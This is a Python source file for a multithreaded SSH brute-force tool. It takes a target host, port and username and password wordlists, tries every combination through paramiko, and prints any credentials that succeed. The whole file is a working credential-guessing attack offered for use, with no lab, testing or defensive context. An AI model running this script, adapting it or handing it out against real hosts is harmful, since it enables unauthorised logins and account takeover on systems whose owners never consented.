from paramiko import SSHClient, AutoAddPolicy
from threading import Thread
from argparse import ArgumentParser


# Get conntent of a file
def getLines(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()
        file.close()
    return tuple(map(lambda line: line.strip(), lines))


# Handler for the script
class BFSSH:
    def __init__(self, rhost, rport, userFile, passwFile, continue_c, maxThreads, mode):
        print("Setting up all the settings")
        # Target's IP/DNS
        self.__rhost = rhost
        # Target's PORT
        self.__rport = rport
        # When the user worlist file is the same for passwords
        if userFile == passwFile:
            self.__usernames = self.__passwords = getLines(userFile)
        else:
            self.__usernames = getLines(userFile)
            self.__passwords = getLines(passwFile)
        # Keep trying passwords to an already cracked user
        self.__continue_c = continue_c
        # Maxmimum number of threads to use wit
        self.__maxThreads = maxThreads
        # Mode for cracking
        self.__mode = {'Paralel': self.__paralelCrack, 'Linear': self.__linearCrack}[mode]

        # Active threads
        self.__activeThreads = 0

        # Handler for identify cracked users
        self.__usersHash = {}
        # Config print
        config = tuple(map(lambda x, y: x.format(y), ('RHOST (IP/DNS)      = {}', 'RPORT               = {}', 'Usernames  wordlist = {}',
                                                'Passwords wordlist  = {}', 'Continue cracking   = {}', 'Maximum N*threads   = {}',
                                                'Mode                = {}'), (rhost, rport, userFile, passwFile, continue_c, maxThreads, mode)))
        lineLength = max(tuple(map(len, config)))
        config = ("-"*(lineLength+2))+"\n"+('\n'.join(f"-{line}" + (" " * (lineLength - len(line))) + "-" for line in config))+"\n"+("-"*(lineLength+2))
        print(config)

    def __checkCreds(self, username, password):
        # Client to check if the username and password provided works with target
        client = SSHClient()
        try:
            # Set missing key
            client.set_missing_host_key_policy(AutoAddPolicy)
            # Connect to target with the given creds
            client.connect(self.__rhost, self.__rport, username, password, timeout=5)
            # Close the client
            client.close()
            return True
        except:
            pass
        # Close The client
        client.close()
        return False

    # Handler for each user in a paralel crack
    def __userHandler(self, username):
        for password in self.__passwords:
            # Check creds (Faster than directly writing each time to memory)
            if self.__checkCreds(username, password):
                # Debug
                print(f"[+]LogIn with {username} {password}")
                # If the username was cracked and don't want to continue with a cracked user break for loop
                if not self.__continue_c:
                    break
        # Remove this thread from the pool
        self.__activeThreads -= 1
        # Kill this thread
        exit(-1)

    # This mode creates a thread for each username
    def __paralelCrack(self):
        for username in self.__usernames:
            # Wait until an available port in the pull is open
            while self.__activeThreads >= self.__maxThreads:
                pass
            # Add new thread to the pool
            self.__activeThreads += 1
            # Start a new thread
            Thread(target=self.__userHandler, args=([username])).start()

    # Handler ofr the linear mode
    def __linearHandler(self, username, password):
        # Procede if username wasn't cracked or when user wants to check more passwords with an already cracked username
        if (not self.__usersHash[username]) or self.__continue_c:
            # When user was cracked
            if self.__checkCreds(username, password):
                # Debug
                print(f"[+]LogIn with {username} {password}")
                # Set username to cracked status
                self.__usersHash[username] = True
        # Remove this thread from the pool
        self.__activeThreads -= 1
        # Kill this thread
        exit(-1)

    # This mode create is the default
    def __linearCrack(self):
        for username in self.__usernames:
            self.__usersHash[username] = False
            for password in self.__passwords:
                # Wait until an available port in the pull is open
                while self.__activeThreads >= self.__maxThreads:
                    pass
                # Add new thread to the pool
                self.__activeThreads += 1
                # Start a new thread
                Thread(target=self.__linearHandler, args=([username, password])).start()

    def start(self):
        self.__mode()
        # Wait until the thread pool is empty
        while self.__activeThreads > 0:
            pass
        # Kill script
        exit(-1)


# Main function to execute the script
def main():
    parser = ArgumentParser()
    parser.add_argument('RHOST', help='Taregt\'s IP/DNS')
    parser.add_argument('-p', '--port', help='Target\'s PORT; Default is 22', type=int, default=22)
    parser.add_argument('-uw', '--user-wordlist', help='File with username for cracking (one per line)', default=False)
    parser.add_argument('-pw', '--password-wordlist', help='File with passwords for cracking (oner per line)',
                        default=False)
    parser.add_argument('-w', '--wordlist', help='File that is used for both usernames, passwords', default=False)
    parser.add_argument('-c', '--continue-cracking', help='Keep trying passwords fora user that is already cracked',
                        action='store_const', const=True, default=False)
    parser.add_argument('-t', '--max-threads', help='Maximum number of threads active at the same time', type=int,
                        default=10)
    parser.add_argument('-P', '--paralel-mode',
                        help='The threads are created for each username; In default mode (linear), all' \
                             ' threads are set for the passwords of each user', default='Linear')
    args = vars(parser.parse_args())
    if args['user_wordlist'] and args['password_wordlist']:
        usernames = args['user_wordlist']
        passwords = args['password_wordlist']
    elif args['wordlist']:
        usernames = passwords = args['wordlist']
    else:
        print(parser)
        return
    bfssh = BFSSH(args['RHOST'], args['port'], usernames, passwords, args['continue_cracking'], args['max_threads'],
                  args['paralel_mode'])
    bfssh.start()


if __name__ == '__main__':
    main()
